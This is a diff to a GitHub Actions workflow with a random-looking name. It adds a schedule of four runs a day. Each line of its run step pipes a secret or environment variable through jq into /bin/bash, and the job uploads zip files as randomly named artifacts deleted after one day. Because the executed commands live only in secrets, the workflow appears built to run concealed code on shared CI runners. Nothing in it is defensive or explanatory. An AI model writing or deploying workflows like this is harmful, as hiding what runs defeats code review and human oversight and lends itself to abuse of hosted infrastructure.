@@ -2,6 +2,8 @@ name: margaretistioj173
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '45 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -9,15 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: margaretistioj173
         env:
-          k1: ${{ secrets.k1 }}
+          u082: ${{ secrets.u082 }}
         run: |
-          printf '%s' "$k1" | jq -r .tc4652 | /bin/bash
-          echo $nt951 | jq -r .rlwp7253 | /bin/bash
-          echo $fluh898 | jq -r .zufs7884 | /bin/bash
+          printf '%s' "$u082" | jq -r .lrmz467 | /bin/bash
+          printf '%s' "$c8626" | jq -r .opter093 | /bin/bash
+          echo $vl20 | jq -r .tqvg255 | /bin/bash
+          printf '%s' "$kcpjw04288" | jq -r .iyu05609 | /bin/bash
+          echo $rhkyw0582 | jq -r .ph249 | /bin/bash
+          echo $jw915 | jq -r .c979 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: E8qRAdUm
+          name: xuwBTsVo
           path: "*.zip"
           retention-days: 1
